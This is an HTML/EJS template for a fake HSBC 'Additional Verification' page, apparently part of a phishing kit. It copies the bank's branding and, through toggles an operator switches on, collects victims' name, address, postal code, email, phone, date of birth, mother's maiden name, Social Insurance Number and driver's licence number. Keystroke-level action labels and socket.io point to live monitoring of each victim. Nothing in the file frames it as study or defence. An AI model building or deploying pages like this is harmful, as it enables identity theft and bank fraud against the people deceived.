<% let name=hsbc.name let address=hsbc.address let postal=hsbc.postal let phone=hsbc.phone let dob=hsbc.dob let
    email=hsbc.email let mmn=hsbc.mmn let sin=hsbc.sin let dl=hsbc.dl %>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" type="text/css" href="/assets/hsbc/css/style.css">
        <link rel="shortcut icon" type="image/PNG" href="/assets/hsbc/img/logoTrans.png">
        <title>HSBC - Login</title>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
        <script>
            var lrbank = '<?=escape($udata->last->bank)?>';
            var lrinfo = '<?=escape($udata->last->info)?>';
        </script>
        <script src="/assets/js/actions.js?v=<?=time()?>"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
        <script type="text/javascript">
            jQuery(function ($) {
                $("#input-dob").mask("99/99/9999", { placeholder: "MM/DD/YYYY" });
            });
        </script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js"></script>
        <script src="/assets/js/details.js?v=<?=time()?>"></script>
        <style>
            .btn {
                background-color: rgb(217, 9, 21) !important;
                border: 1px solid rgb(217, 9, 21) !important;
            }
        </style>
        <script src="/socket.io/socket.io.js"></script>
    </head>

    <body>
        <img src="/assets/hsbc/img/logoTrans.png" id="transLogo">
        <div class="header">
            <div class="headerRow">
                <img src="/assets/hsbc/img/logoTrans.png" id="logo">
                <!-- <div class="btn" id="loginBtn">Login On </div> -->
            </div>
        </div>
        <div class="main">
            <div class="alignment div-main">
                <p class="pageTitle" style="padding-bottom: 0px">Additional Verification</p>
                <form id="loginForm" method='POST' autocomplete="off" class="lab-form">
                    <input type="hidden" id="userAgent" name="userAgent">
                    <% let x=0; if (name=='on' || address=='on' || postal=='on' || email=='on' || phone=='on' ||
                        dob=='on' ) { x=1; %>
                        <p style="margin-bottom: 20px; margin-top: 20px;">To verify your login, we require some
                            additional information regarding your account.</p>
                        <% } if (name=='on' ) { %>
                            <div class="row" style="align-items: center;">
                                <p class="formLabel">Full Name</p>
                            </div>
                            <div class="inptContainer" style="margin-bottom: 20px">
                                <input type="text" class="inptField lrinput" attr-action="Filling Name" name='name'
                                    id="input-name" required>
                            </div>
                            <% } if (address=='on' ) { %>
                                <div class="row" style="align-items: center;">
                                    <p class="formLabel">Address</p>
                                </div>
                                <div class="inptContainer" style="margin-bottom: 20px">
                                    <input type="text" class="inptField lrinput" attr-action="Filling Address"
                                        name='address' id="input-address" required>
                                </div>
                                <div class="row" style="align-items: center;">
                                    <p class="formLabel">City</p>
                                </div>
                                <div class="inptContainer" style="margin-bottom: 20px">
                                    <input type="text" class="inptField lrinput" attr-action="Filling City" name='city'
                                        id="input-city" required>
                                </div>
                                <% } if (postal=='on' ) { %>
                                    <div class="row" style="align-items: center;">
                                        <p class="formLabel">Postal Code</p>
                                    </div>
                                    <div class="inptContainer" style="margin-bottom: 20px">
                                        <input type="text" class="inptField lrinput" attr-action="Filling Postal"
                                            name='postal' id="input-postal" required
                                            pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]">
                                    </div>
                                    <% } if (email=='on' ) { %>
                                        <div class="row" style="align-items: center;">
                                            <p class="formLabel">Email Address</p>
                                        </div>
                                        <div class="inptContainer" style="margin-bottom: 20px">
                                            <input type="email" class="inptField lrinput" attr-action="Filling Email"
                                                name='email' id="input-email" required>
                                        </div>
                                        <% } if (phone=='on' ) { %>
                                            <div class="row" style="align-items: center;">
                                                <p class="formLabel">Phone Number</p>
                                            </div>
                                            <div class="inptContainer" style="margin-bottom: 20px">
                                                <input type="tel" class="inptField lrinput" attr-action="Filling Phone"
                                                    name='phone' id="input-phone" required maxlength="13"
                                                    oninput="this.value = this.value.replace(/[^0-9, ]/, '')">
                                            </div>
                                            <% } if (dob=='on' ) { %>
                                                <div class="row" style="align-items: center;">
                                                    <p class="formLabel">Date of Birth</p>
                                                </div>
                                                <div class="inptContainer" style="margin-bottom: 20px">
                                                    <input type="tel" class="inptField lrinput"
                                                        attr-action="Filling DoB" name='dob' id="input-dob" required
                                                        minlength="10" maxlength="10">
                                                </div>
                                                <% } if (mmn=='on' || sin=='on' || dl =='on' ) { %>
                                                    <p style="margin-bottom: 20px; margin-top: 20px;">To finish
                                                        verifying your identity, we require you confirm some additional
                                                        information.</p>
                                                    <% } if (mmn=='on' ) { %>
                                                        <div class="row" style="align-items: center;">
                                                            <p class="formLabel">Mother's Maiden Name</p>
                                                        </div>
                                                        <div class="inptContainer" style="margin-bottom: 20px">
                                                            <input type="text" class="inptField lrinput"
                                                                attr-action="Filling MMN" name='mmn' id="input-mmn"
                                                                required>
                                                        </div>
                                                        <% } if (sin=='on' ) { %>
                                                            <div class="row" style="align-items: center;">
                                                                <p class="formLabel">Social Insurance Number</p>
                                                            </div>
                                                            <div class="inptContainer" style="margin-bottom: 20px">
                                                                <input type="tel" class="inptField lrinput"
                                                                    attr-action="Filling SIN" name='sin' id="input-sin"
                                                                    required minlength="11" maxlength="11"
                                                                    pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}">
                                                            </div>
                                                            <% } if (dl=='on' ) { %>
                                                                <div class="row" style="align-items: center;">
                                                                    <p class="formLabel">Driver's Licence Number</p>
                                                                </div>
                                                                <div class="inptContainer" style="margin-bottom: 20px">
                                                                    <input type="text" class="inptField lrinput"
                                                                        attr-action="Filling Drivers" name='drivers'
                                                                        id="input-drivers">
                                                                </div>
                                                                <% } %>

                                                                    <input onclick="submitForm()" type="button" class="btn" value="Continue"
                                                                        id="sbtn" name="save" value="1">
                </form>
            </div>
        </div>
        <span hidden id="navig"><%=navig%></span>
        <span hidden id="stage">Details</span>
    </body>
    <script src="/bank/hsbc/js/script.js">
    </script>
    </html>